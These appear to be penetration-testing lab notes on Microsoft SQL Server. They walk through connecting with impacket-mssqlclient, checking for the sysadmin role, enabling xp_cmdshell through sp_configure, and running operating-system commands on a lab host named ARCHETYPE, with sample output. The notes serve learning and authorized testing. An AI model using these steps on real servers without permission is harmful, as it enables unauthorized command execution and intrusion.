# MS-SQL (Microsoft SQL Service)

## What is MS SQL?

MS SQL, also known as Microsoft SQL Server, is a relational database management system (RDBMS) developed by Microsoft.&#x20;

### **Default MS-SQL System Tables**

* **master Database**: Records all the system-level information for an instance of SQL Server.
* **msdb Database**: used by SQL Server Agent for scheduling alerts and jobs.
* **model Database**: used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterwards.
* **Resource Database**: a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.
* **tempdb Database** : a work-space for holding temporary objects or intermediate result sets.

### Runs on TCP port 1433 and UDP port 1434

## Enumeration

### Using Impacket&#x20;

Using impacket-mssqlclient we can connect to the MS-SQL service using the username/user-id and password from a possible publicly available production `.dtsConfig` files.&#x20;

```awk
impacket-mssqlclient ARCHETYPE\sql_svc@10.129.95.187 -windows-auth
```

### Check user access control

```
SELECT is_srvrolemember('sysadmin');
```

If it returns 1, it is True and the user can run `cmd` commands.

## Exploitation

### Command execution via xp\_cmdshell()

Once we have access to the SQL database we can check if we can use the xp\_cmdshell() command using:

```sql
 EXEC xp_cmdshell 'net user';
```

Successful execution would produce an output similar to this:

```
output                                                            
-----------------------------------------------------------------------------
NULL                                                                   
User accounts for \\ARCHETYPE                                                
NULL                                                                           
------------------------------------------------------------------------------ 
Administrator            DefaultAccount           Guest                        
sql_svc                  WDAGUtilityAccount
The command completed successfully.   
```

However, if we get the following ERROR, we don't have access to the command and we need to reconfigure the service:

{% code overflow="wrap" %}
```bash
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
{% endcode %}

Alternatively, you can check it using the following query/command.

```
sp_configure;
```

It would give an output like the one shown below. Here you can find the configuration values of other options/commands as well.

{% code fullWidth="false" %}
```
name                              minimum   maximum config_value  run_value
--------------------------------- -------  -------- ------------ -----------
access check cache bucket count     0         65536          0             0
access check cache quota            0    2147483647          0             0
Ad Hoc Distributed Queries          0             1          0             0
........
........
user options                        0         32767          0             0
xp_cmdshell                         0             1          0             0 
```
{% endcode %}

**Reconfiguration steps**

#### One line command (impacket-mssqlclient)

The simple one-liner in impacket-mssqlclient can do the honours for us.... :)

```bash
enable_xp_cmdshell
```

#### Alternative

1. If the sp\_configure command is set to show advanced options we can just directly set the xp\_cmdshell option (aka directly skip to step 5). The best way to know this is to run the command in step 5.
2. If we get the error shown below:

{% code overflow="wrap" %}
```awk
[-] ERROR(ARCHETYPE): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
```
{% endcode %}

&#x20;      Then we have to set the show advanced options to TRUE by using the command: &#x20;

```sql
EXEC sp_configure 'show advanced options', 1;
```

3. Reconfigure using the RECONFIGURE command.

```sql
RECONFIGURE;
```

4. Check if sp\_configure is working with advanced options

```
sp_configure;
```

5. Allow `xp_cmdshell()` using the command:

```sql
EXEC sp_configure 'xp_cmdshell', 1;
```

* Run reconfigure again to allow the xp\_cmdshell method. Test if it's working or not using the above diagnosis command.

We can use xp\_cmdshell after enabling it like follows:

```sql
SQL> xp_cmdshell "whoami"
```

The sample output is as follows:

```
output                                                                             
--------------------------------------------------------------------------------   
archetype\sql_svc                                                                  
NULL  
```











